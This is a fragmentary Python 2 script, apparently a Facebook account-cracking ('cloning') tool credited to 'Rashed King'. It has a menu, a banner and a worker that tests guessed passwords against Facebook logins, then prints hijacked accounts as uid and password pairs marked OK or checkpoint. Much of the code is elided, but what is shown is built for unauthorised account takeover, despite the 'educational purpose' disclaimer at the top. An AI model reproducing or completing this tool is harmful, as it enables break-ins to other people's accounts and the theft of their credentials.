#Script Given By Rashed King of Devil's

#Script Is Given For Educational Purpose

#Script Edited By @Hunter_King-Rashed
...
Rashed = ['Op Bolty','Good Jani','Keep It Up ','Wah Bhai','Kia Baat Hy ','Aag Lga Di','Tu Baqio Sy Alag Hy Vro','Agar May Larki Hota Toh Tuj sy Shaadi Krta ','Ha Chikny Lub u']

Rashedchoice = random.choice(Rashed)
...
\033[1;92mAuthor \033[1;93m: Rashed-king

\033[1;92mFb \033[1;93m: Swabi wall
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://web.facebook.com/naveed.malangibamani/')
...
def crack():
    ...
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks Rashed-king
...
def crack_select():
    ...
    print ' \x1b[1;94m  Wait Ids Will Appear Here \033[0m'#Thanks Rashed-king
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;32m[Rashed-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                print '\x1b[1;31m[Rashed-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
    ...
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks Rashed-King
